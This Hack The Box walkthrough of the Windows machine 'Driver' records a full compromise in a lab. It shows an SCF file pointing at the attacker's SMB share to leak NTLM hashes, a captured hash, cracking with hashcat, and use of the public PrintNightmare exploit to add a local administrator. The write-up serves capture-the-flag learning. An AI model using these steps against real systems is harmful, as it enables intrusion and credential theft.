---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Responder
  - CVE-2021-1675
  - PrintNightmare
---
# Overview

| Name        | Driver    |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap 

```bash
$ sudo nmap -sC -sV -T4 10.129.147.28
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 03:34 CDT
Nmap scan report for 10.129.147.28
Host is up (0.076s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-17T15:34:23
|_  start_date: 2025-10-17T15:32:13
```

Anonymous SMB doesn't work.

![[driver.png]]

`admin:admin` worked.

![[driver2.png]]
# Initial Foothold

We can create a `.scf` file(Shell Command File) that we can further use to force the system to access a remote SMB share, prompting it to send NTLM authentication credentials that Responder can potentially capture.

Create file name `@something.scf`:

```
[Shell]
Command=2
IconFile=\\10.10.14.122\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

Upload it and start Responder.
## Responder

```bash
$ sudo responder -I tun0 -v

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.122]
    Responder IPv6             [dead:beef:2::1078]
    Challenge set              [random]
    Dont Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-O5RRDXAEKQX]
    Responder Domain Name      [SKE4.LOCAL]
    Responder DCE-RPC Port     [49504]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.147.28
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:7d356172bd97a4d4:67CEDA260474BC4590C6763B8F15E642:010100000000000080A46D01183FDC01A1941B325C9414FE000000000200080053004B004500340001001E00570049004E002D004F0035005200520044005800410045004B005100580004003400570049004E002D004F0035005200520044005800410045004B00510058002E0053004B00450034002E004C004F00430041004C000300140053004B00450034002E004C004F00430041004C000500140053004B00450034002E004C004F00430041004C000700080080A46D01183FDC01060004000200000008003000300000000000000000000000002000006DAFB71333C8B04CDF5B233794EC71F31DF36AD5E622192971AC37A6F53C04890A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310032003200000000000000000000000000
```

```bash
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
```

We get pass `liltony`.

```powershell
$ evil-winrm -i 10.129.147.28 -u tony -p liltony
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
cb27c19cbe842c5feb348b57e8dbd166
```
# Privilege Escalation
## [CVE-2021-1675 - PrintNightmare LPE](https://github.com/calebstewart/CVE-2021-1675)

```powershell
*Evil-WinRM* PS C:\Users\tony\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

```bash
$ rpcdump.py 10.129.147.28
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Retrieving endpoint list from 10.129.147.28
<SNIP>
Protocol: [MS-RPRN]: Print System Remote Protocol 
Provider: spoolsv.exe 
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 
<SNIP>
```

The **MS-RPRN** protocol is exposed via RPC. This is the Print System Remote Protocol that PrintNightmare exploits

```bash
$ git clone https://github.com/calebstewart/CVE-2021-1675
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 40 (delta 1), reused 1 (delta 1), pack-reused 37 (from 1)
Receiving objects: 100% (40/40), 127.17 KiB | 6.36 MiB/s, done.
Resolving deltas: 100% (9/9), done.
```

```powershell
*Evil-WinRM* PS C:\Users\tony\Desktop> upload CVE-2021-1675/CVE-2021-1675.ps1
                                        
Info: Uploading /home/ninjathebox98w1/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Desktop\CVE-2021-1675.ps1
                                        
Data: 238080 bytes of 238080 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\tony\Desktop> Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
*Evil-WinRM* PS C:\Users\tony\Desktop> Import-Module .\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Desktop> 
```

```powershell
*Evil-WinRM* PS C:\Users\tony\Desktop> Invoke-Nightmare -NewUser "amroot" -NewPassword "P@ssw0rd123!"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user amroot as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Users\tony\Desktop> net user amroot
User name                    amroot
Full Name                    amroot
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/17/2025 9:00:51 AM
Password expires             Never
Password changeable          10/17/2025 9:00:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

```bash
$ evil-winrm -i 10.129.147.28 -u amroot -p P@ssw0rd123!

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\amroot\Documents> type C:\Users\Administrator\Desktop\root.txt
68b19ec85e03c5d7d4aa1cd1c3bbf454
```

---
